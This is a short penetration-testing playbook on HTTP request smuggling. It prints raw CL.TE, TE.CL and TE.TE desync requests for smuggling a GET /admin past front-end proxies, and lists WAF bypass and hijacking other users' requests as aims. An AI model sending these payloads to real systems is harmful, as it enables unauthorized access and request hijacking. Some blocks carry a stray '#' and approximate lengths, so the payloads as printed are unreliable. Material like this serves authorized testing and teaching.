# HTTP Request Smuggling (Desync Attacks)

## When to Use
- When testing web applications sitting behind reverse proxies, load balancers, or CDNs (e.g., Cloudflare, HAProxy, AWS ALB).
- To bypass WAFs, gain unauthorized access to hidden administrative panels, or hijack requests of other users sharing the same persistent connection.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying the Infrastructure (CL.TE or TE.CL)

```http
# Concept: Send overlapping headers to observe timeout behavior # Testing CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```
*(If the backend is TE, it processes `1\r\nZ`, then waits for the chunk terminator `0`, causing a timeout)*

### Phase 2: Exploiting CL.TE to Smuggle a Request

```http
# POST / HTTP/1.1
Host: example.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com


```
*(Frontend sees Content-Length of 44 and forwards the whole block. Backend sees chunked `0`, ends the first request, and treats `GET /admin` as the start of the NEXT user's request)*

### Phase 3: Exploiting TE.CL to Smuggle a Request

```http
# POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12
GET /admin HTTP/1.1
0


```
*(Frontend sees TE, parses chunks up to `0\r\n\r\n`. Backend sees Content-Length `4` (`12\r\n`), and leaves `GET /admin...` in the buffer for the next request).*

### Phase 4: Exploiting TE.TE (Obfuscating Transfer-Encoding)

```http
# POST / HTTP/1.1
Host: example.com
Content-Length: 44
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

0

GET /admin HTTP/1.1
Host: example.com


```
*(Proxy 1 accepts the first TE, Proxy 2 ignores the malformed TE and falls back to CL, resulting in desynchronization).*
